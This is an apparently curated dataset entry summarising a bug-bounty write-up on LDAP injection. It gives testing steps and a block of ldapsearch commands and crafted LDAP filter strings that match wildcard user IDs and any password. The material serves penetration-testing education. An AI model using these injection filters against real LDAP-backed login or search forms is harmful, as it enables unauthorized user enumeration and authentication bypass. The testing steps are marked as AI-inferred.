---
id: 0444d750666e
title: "AppSec Tales XXII | LDAPI"
source_url: https://karol-mazurek95.medium.com/appsec-tales-xxii-ldapi-fcef1f40e9b2
author: "Karol Mazurek"
publication_date: 2023-11-11
category: injection
category_label: "Injection (SQL / NoSQL)"
content_type: vuln_writeup
steps_source: ai_inferred
tags:
  - "information-technology"
  - "bug-bounty"
  - "cybersecurity"
  - "information-security"
  - "penetration-testing"
tools:
  []
quick_test: "Test input fields for LDAP injection by submitting crafted LDAP query strings and observing the application's response."
---

## Use case

The application was vulnerable to LDAP injection due to unsanitized user input in LDAP queries, allowing attackers to manipulate queries and potentially access unauthorized data.

## Steps to test

1. Identify the input fields that interact with LDAP queries, such as login forms or search boxes.
2. Input a crafted LDAP query string into the identified field, such as '(uid=Karol*)'.
3. Observe the application's response to determine if it returns unexpected data or errors.
4. Test various LDAP operators like NOT, AND, and OR to see if the application processes them without sanitization.

## Commands

```text
ldapsearch -x -b 'dc=example,dc=com' '(uid=Karol*)'
ldapsearch -x -b 'dc=example,dc=com' '(&(uid=K*)(userPassword=*))'
ldapsearch -x -b 'dc=example,dc=com' '(|(uid=Karol*)(uid=A*))'
ldapsearch -x -b 'dc=example,dc=com' '(&(|(!(uid=Karol))(uid=K*))(userPassword=*)))'
# Matches any user ID starting with Karol:
(uid=Karol*)(userPassword=*)
# Uses the NOT operator(!).
# Matches entries where the user ID does not start with Karol:
(!(uid=Karol*))
# Uses the AND operator(&).
# Matches entries with user IDs starting with K and having any password:
(&(uid=K*)(userPassword=*))
# Uses the OR operator(|).
# Matches user IDs starting with Karol or A
(|(uid=Karol*)(uid=A*))
# Combined - NOT(!) Karol, BUT(|) starting from K AND(&) have any password:
(&(|(!(uid=Karol))(uid=K*))(userPassword=*))
```

## Source

- Author: Karol Mazurek
- Writeup: https://karol-mazurek95.medium.com/appsec-tales-xxii-ldapi-fcef1f40e9b2

_For authorized testing only. Credit the original author._
